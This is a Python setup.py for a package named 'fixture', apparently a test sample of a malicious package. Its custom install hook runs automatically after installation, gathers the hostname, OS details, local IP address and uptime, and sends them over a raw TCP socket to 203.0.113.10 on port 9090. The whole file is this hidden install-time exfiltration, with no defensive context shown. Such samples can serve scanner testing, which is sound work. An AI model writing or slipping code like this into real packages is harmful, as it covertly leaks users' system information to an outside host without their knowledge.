import platform
import socket
from setuptools import setup
from setuptools.command.install import install


class Install(install):
    def run(self):
        install.run(self)
        hostname = socket.gethostname()
        systeminfo = ("OS:", platform.release(), "SysName:", platform.system(), "OSVersion:", platform.version(), "Platform:", platform.platform(), "IPDetails:", socket.gethostbyname(socket.gethostname()))
        with open("/proc/uptime") as source:
            uptime = source.read()
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect(("203.0.113.10", 9090))
        client.send(f"{hostname} {systeminfo} {uptime}".encode())


setup(name="fixture", cmdclass={"install": Install})
